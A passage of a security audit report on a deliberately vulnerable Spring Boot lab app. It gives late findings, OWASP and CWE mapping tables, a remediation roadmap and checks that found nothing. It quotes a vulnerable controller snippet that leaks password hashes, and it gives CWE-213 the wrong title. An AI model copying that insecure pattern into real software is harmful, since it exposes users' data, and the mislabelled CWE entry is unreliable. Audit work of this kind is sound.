- **Root Cause:** CSRF is technically enabled (good) but with STATELESS session and HTTP Basic the browser will not auto-attach the `Authorization` header cross-origin, so CSRF is largely moot **today**. However the moment the operator switches to cookie-based sessions or JWT-in-cookie auth, CSRF becomes an issue. The transfer endpoint is the highest-value target.
- **Exploitation Scenario:** Future cookie-auth refactor + no `SameSite=Strict` cookie → CSRF transfer.
- **Business Impact:** Latent.
- **Confidence Level:** Low

---

### VULN-022 — `@JsonIgnore` / projection not used; entities leak hashes & PII over JSON

- **Vulnerability Name:** Sensitive data exposure via serialization.
- **CWE ID:** CWE-213 (Invocation of Process Using Explicit Sensitive Information) / CWE-359
- **OWASP Top 10 Category:** A01:2021 – Broken Access Control (information disclosure facet)
- **Severity:** High
- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\model\User.java`, exposed through `UserController.listUsers`
- **Vulnerable Code Snippet:**
  ```java
  public List<User> listUsers(@AuthenticationPrincipal UserDetails caller) {
      ...
      return userService.findAll();
  }
  ```
- **Root Cause:** No DTO, no `@JsonIgnore` on `User.password`/`User.email`, no projection interface. ADMINs (and via VULN-002, anyone who finds a way to elevate) get the full entity including the BCrypt hash, the email, and the balance.
- **Exploitation Scenario:** Compromised admin credential → full PII dump.
- **Business Impact:** GDPR / privacy breach; offline cracking of the hashes.
- **Confidence Level:** High

---

## 4. OWASP Top 10 (2021) Mapping

| OWASP Category | Finding IDs | Severity(s) |
| --- | --- | --- |
| **A01:2021 – Broken Access Control** | VULN-001, VULN-002, VULN-006, VULN-022 | High, High, Low, High |
| **A02:2021 – Cryptographic Failures** | VULN-004, VULN-008, VULN-015 | Medium, Medium, Low |
| **A03:2021 – Injection** | VULN-012, VULN-013 | Low, Low |
| **A04:2021 – Insecure Design** | VULN-003, VULN-016 | Medium, Medium |
| **A05:2021 – Security Misconfiguration** | VULN-007, VULN-009, VULN-010, VULN-011, VULN-014, VULN-017, VULN-019, VULN-021 | Low, Low, Low, Low, Medium, Info, Low, Info |
| **A06:2021 – Vulnerable & Outdated Components** | VULN-018 | Medium |
| **A07:2021 – Identification & Authentication Failures** | VULN-003, VULN-005 | Medium, Medium |
| **A08:2021 – Software & Data Integrity Failures** | (None remaining — native deserialization replaced with Jackson in `InsecureDeserializationController`) | – |
| **A09:2021 – Security Logging & Monitoring Failures** | VULN-020 | Info |
| **A10:2021 – Server-Side Request Forgery** | (No `HttpURLConnection`, `RestTemplate`, or `WebClient` with user-controlled URLs found in this scan) | – |

---

## 5. CWE Mapping

| CWE | Description | Finding IDs |
| --- | --- | --- |
| CWE-20  | Improper Input Validation | VULN-016 |
| CWE-79  | Improper Neutralization of Input During Web Page Generation (XSS) | VULN-012, VULN-013 |
| CWE-200 | Exposure of Sensitive Information to an Unauthorized Actor | VULN-004, VULN-014, VULN-017, VULN-022 |
| CWE-213 | Invocation of Process Using Explicit Sensitive Information | VULN-022 |
| CWE-256 | Plaintext Storage of a Password | VULN-004 |
| CWE-269 | Improper Privilege Management | VULN-003 |
| CWE-284 | Improper Access Control | VULN-007 |
| CWE-307 | Improper Restriction of Excessive Authentication Attempts | VULN-003, VULN-005 |
| CWE-319 | Cleartext Transmission of Sensitive Information | VULN-008, VULN-009 |
| CWE-352 | Cross-Site Request Forgery | VULN-021 |
| CWE-359 | Exposure of Private Personal Information | VULN-022 |
| CWE-522 | Insufficiently Protected Credentials | VULN-015 |
| CWE-639 | Authorization Bypass Through User-Controlled Key | VULN-002, VULN-006 |
| CWE-668 | Exposure of Resource to Wrong Sphere | VULN-019 |
| CWE-693 | Protection Mechanism Failure | VULN-010 |
| CWE-862 | Missing Authorization | VULN-001 |
| CWE-915 | Improperly Controlled Modification of Dynamically-Determined Object Attributes | VULN-002 |
| CWE-1021 | Improper Restriction of Rendered UI Layers or Frames | VULN-011 |
| CWE-1104 | Use of Unmaintained Third Party Components | VULN-018 |
| CWE-1188 | Initialization of a Resource with an Insecure Default | VULN-014 |
| CWE-1395 | Dependency on Vulnerable Third-Party Component | VULN-018 |
| CWE-778  | Insufficient Logging | VULN-020 |

---

## 6. Priority Remediation Roadmap

### Critical
*(none)*

### High

1. **VULN-022 / VULN-002** — Stop returning JPA entities from controllers. Introduce `UserSummaryDto` (id, username, role) and `UserAdminDto` (id, username, email, role — but never `password` or `balance`); annotate `User.password` and `User.balance` with `@JsonIgnore(access = JsonProperty.Access.WRITE_ONLY)`. Replace `setRole` with a package-private builder so the field is not mutable from arbitrary request bodies.
2. **VULN-001** — Lock down `ProductController` with `.requestMatchers(HttpMethod.POST, "/api/products").hasRole("ADMIN")` (or `@PreAuthorize("hasRole('ADMIN')")` with `@EnableMethodSecurity`) and `@Valid` on the body.
3. **VULN-002** — Make `User.role` immutable after construction (final field, set only via constructor) and remove `setRole` entirely; introduce an explicit `RoleService.assignRole(caller, target, role)` that requires `ROLE_ADMIN`.

### Medium

4. **VULN-005** — Add a rate-limiter on `/api/login` (e.g. Bucket4j filter, or move auth to Spring Security's `UsernamePasswordAuthenticationFilter` and configure `AbstractUserDetailsAuthenticationProvider` lockout via a `LoginAttemptService`).
5. **VULN-003** — Add `@Valid`, Bean Validation (`@NotBlank`, `@Size`, `@Email`) on `User` and a `RegistrationService` that enforces username uniqueness and emits a structured audit log.
6. **VULN-004** — Rename the JPA column `password` → `password_hash`; annotate the field with `@JsonIgnore`; never expose it through any controller.
7. **VULN-008** — Add `.requiresChannel(rc -> rc.anyRequest().requiresSecure())` in `SecurityConfig` and configure TLS (Spring Boot `server.ssl.*` or a terminating proxy) — and document in `application.properties`.
8. **VULN-014** — Default `H2_CONSOLE_ENABLED=false` (already done); additionally enforce `spring.h2.console.settings.web-admin-allow-others=false` and never enable the console in non-`local` profiles. Change `ddl-auto=create` to `validate` for any environment that is not first-boot.
9. **VULN-016** — Add `spring-boot-starter-validation` to `pom.xml`; annotate `User.username`, `User.password`, `User.email`, `Product.name`, `Product.price`, `Comment.body`, `Comment.author`; add `@Valid` on every `@RequestBody` and `@Validated` on controller classes for `@RequestParam`.
10. **VULN-018** — Upgrade Spring Boot to the latest 3.x release (run `mvn dependency-check:check` first; pin H2 explicitly to a patched version).

### Low

11. **VULN-006** — Mark `UserService.findByIdUnsafe` `@Deprecated(forRemoval=true)` or repackage it into a `private` helper used only by IDOR-checked controllers; provide a safe `findOwnedById(caller, id)` API.
12. **VULN-007** — Make `/h2-console/**` permit conditional on a `@Profile("local")` bean rather than a runtime env var; remove `permitAll` from `/h2-console/**` in `SecurityConfig` (and switch H2 to a non-HTTP management surface for non-local envs).
13. **VULN-009** — Combined with VULN-008 (TLS enforced), document HSTS expectation in `application.properties`.
14. **VULN-010** — Extend CSP to `default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'none'; form-action 'self'`. Add explicit `.contentTypeOptions(c -> {})` (nosniff) and `.xssProtection(...)` blocks.
15. **VULN-011** — Switch `frameOptions` to `deny()` for all non-H2 routes and gate H2-only framing behind an `AntPathRequestMatcher`.
16. **VULN-012** — Add input length limit (`@Size(max=2000)` matches existing column length) and reject any `<` or `>` in author on input (defence-in-depth) — keep output escaping as the primary defence.
17. **VULN-013** — Replace `HtmlUtils.htmlEscape` with `org.owasp.encoder.Encode.forHtml` (add OWASP Java Encoder dependency).
18. **VULN-015** — Remove the named `String` beans in `SecretConfig`; load secrets inside the specific consumer (e.g. a JWT signer) using `@Value` and do not register them as application beans.
19. **VULN-019** — Add `server.address=127.0.0.1` to `application.properties`; require operators to override it explicitly.

### Informational

20. **VULN-017** — Add `spring-boot-starter-actuator` to a non-prod profile only, with `management.endpoints.web.exposure.include=health,info` and never expose `env`, `heapdump`, `threaddump` publicly.
21. **VULN-020** — Enrich failed-login log to include remote IP, user-agent, request id, and a `correlation_id` MDC; ship via structured JSON appender (e.g. `logstash-logback-encoder`).
22. **VULN-021** — When switching to cookie-based auth in the future, set `Set-Cookie: ...; SameSite=Strict; Secure; HttpOnly` and keep CSRF enabled; never disable CSRF on `/api/transfer`.

---

## 7. Checks With No Findings (explicitly noted)

The following categories were checked and produced **no findings** in the current codebase:

- **SQL Injection in JPQL / native queries** — both `UserService.findByUsernameUnsafe` and `UserService.loginUnsafe` use parameterised `:username` bindings (lines 38–43 and 64–69). No string concatenation into queries was found.
- **NoSQL / LDAP injection** — no MongoDB or LDAP usage in the project.
- **Command Injection** — no `Runtime.exec`, `ProcessBuilder`, or shell-call sites were found.
- **SpEL / OGNL Expression Injection** — no user-controlled SpEL or OGNL evaluation was found.
- **Native Java deserialization on untrusted data** — `InsecureDeserializationController` no longer uses `ObjectInputStream.readObject`; it parses JSON via Jackson.
- **Insecure RNG (`java.util.Random` for security tokens)** — no `new Random()` calls in production code (only Lombok-injected beans).
- **Path traversal** — no `new File(userInput)` patterns were found.
- **File upload** — no multipart endpoints exist.
- **CORS misconfiguration** — no explicit `CorsConfigurationSource` or `allowedOrigins` is configured; Spring's defaults apply (no permissive `*`).
- **Hardcoded API keys / passwords in source code or `application.properties`** — the file references `${APP_SECRET_API_KEY:}` placeholders with **no default value**; this is the recommended pattern (no secret literal in VCS). The `application.properties` comment header explicitly says "EDUCATIONAL USE ONLY".
- **Verbose error messages** — `server.error.include-stacktrace=never` and `server.error.include-message=never` are explicitly set.
- **Hibernate SQL parameter logging** — `logging.level.org.hibernate.SQL=WARN` and `logging.level.org.hibernate.type.descriptor.sql=NONE` are set.

---

## 8. Closing Notes

- **CVE cross-reference for dependencies** was not performed against an online database; use `mvn org.owasp:dependency-check-maven:check` or OWASP Dependency-Check for authoritative CVE results against Spring Boot 3.2.5 and H2.
- **No code was modified.** Only this report file at `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\.claude\reports\SECURITY_ASSESSMENT_REPORT.md` was written.
- The remediator's own comments document past fixes (VULN-002/004/005/006/007/008/009/010/011/012/013/014/015/016/017). The findings above either flag **partial remediation** (the helper `findByIdUnsafe` still exists, the `permitAll` list still includes the H2 console, the role setter is still public) or **new weaknesses introduced by the remediation** (HTTP Basic over plaintext, named secret beans, dependency staleness, missing input validation on the very endpoints that were just remediated).